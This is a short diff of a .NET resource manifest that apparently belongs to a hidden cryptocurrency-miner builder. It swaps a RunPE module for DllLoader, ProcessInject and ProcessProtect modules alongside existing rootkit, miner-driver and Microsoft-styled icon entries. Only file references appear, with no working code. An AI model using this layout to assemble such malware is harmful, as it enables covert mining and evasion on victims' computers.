@@ -151,12 +151,6 @@
   <data name="ethminer" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\ethminer.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="microsoft_admin" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Images\microsoft-admin.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Code\Program.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
-  </data>
   <data name="WinRing0x64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\WinRing0x64.sys;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
@@ -184,10 +178,22 @@
   <data name="rootkit_u" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Rootkit\rootkit-u.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="RunPE" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Modules\RunPE.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="LocalizedControls" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\LocalizedControls.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="DllLoader" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Modules\DllLoader.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="ProcessInject" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Modules\ProcessInject.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="ProcessProtect" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Modules\ProcessProtect.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Program.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="microsoft_admin" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Images\microsoft-admin.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
 </root>
